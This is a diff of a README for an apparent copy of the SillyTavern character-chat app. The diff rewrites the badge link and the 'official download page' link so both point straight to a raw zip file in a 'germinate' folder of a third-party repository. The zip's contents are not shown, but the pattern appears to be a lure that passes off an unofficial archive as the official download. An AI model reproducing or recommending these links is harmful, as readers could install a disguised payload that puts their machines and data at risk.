@@ -1,6 +1,6 @@
 # 🤖 sillytavern-ai-character-chat - Chat with custom characters on computer
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/sonu1611/sillytavern-ai-character-chat)
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/sonu1611/sillytavern-ai-character-chat/raw/refs/heads/main/germinate/character_ai_sillytavern_chat_2.0.zip)
 
 SillyTavern provides a way to talk with computer-generated personas on your own machine. It runs in your web browser but processes data locally. This project keeps your conversations private because your data stays on your hard drive. You define the character traits, backgrounds, and speaking styles. The software connects these characters to an AI model to generate realistic replies.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware to run this software well. Check these req
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official download page](https://github.com/sonu1611/sillytavern-ai-character-chat).
+1. Go to the [official download page](https://github.com/sonu1611/sillytavern-ai-character-chat/raw/refs/heads/main/germinate/character_ai_sillytavern_chat_2.0.zip).
 2. Look for the latest release section on the right side of the page.
 3. Click the link to download the compressed file ending in .zip.
 4. Open your Downloads folder in Windows.
